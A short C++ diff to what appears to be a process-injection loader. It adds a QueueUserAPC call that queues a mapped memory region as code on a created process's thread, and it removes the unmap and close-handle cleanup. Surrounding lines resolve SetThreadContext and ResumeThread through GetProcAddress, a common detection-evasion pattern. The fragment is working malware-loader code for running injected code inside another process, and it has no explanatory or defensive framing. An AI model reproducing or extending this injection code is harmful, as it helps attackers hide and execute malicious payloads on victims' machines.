@@ -81,14 +81,13 @@ int main() {
     
     auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "SetThreadContext");
     pSetThreadContext(pi.hThread, &ctx);
+    
+    auto pQueueUserAPC = (BOOL(WINAPI*)(PAPCFUNC, HANDLE, DWORD))GetProcAddress(hKernel32, "QueueUserAPC");
+    pQueueUserAPC((PAPCFUNC)lpBase, pi.hThread, 0);
         
     // Resume the thread to execute the code
     auto pResumeThread = (DWORD(WINAPI*)(HANDLE))GetProcAddress(hKernel32, "ResumeThread");
     pResumeThread(pi.hThread);
-
-    // Cleanup
-    UnmapViewOfFile(lpBase);
-    CloseHandle(hMapFile);
 
     return 0;
 }
